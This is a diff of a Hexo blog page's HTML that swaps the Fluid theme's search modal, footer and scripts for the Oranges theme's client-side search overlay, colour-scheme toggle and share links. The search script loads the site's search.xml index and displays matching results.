-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
       </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
+      <div class="search-result" id="search-result"></div>
     </div>
   </div>
-</div>
 
-    
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
 
-    
-  </main>
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
 
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-  
-  
-</div>
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
 
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
       }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
   </script>
 
 
 
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      collapseDepth   : CONFIG.toc.collapseDepth || 0,
-      scrollSmooth    : true,
-      headingsOffset  : -boardTop
-    });
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
 
   
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-  });
-</script>
+<script src="/js/colorscheme.js"></script>
 
 
+
+
+
+        
   
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + JAVA%E5%AE%89%E5%85%A8-JWT%E5%AE%89%E5%85%A8%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%20CASE%20%E6%B3%A8%E5%85%A5 + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2F43f09137%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/43f09137/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
   
+  
+<script src="/js/shares.js"></script>
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-</body>
+
+
+      </div>
+    </div>
+  </body>
 </html>
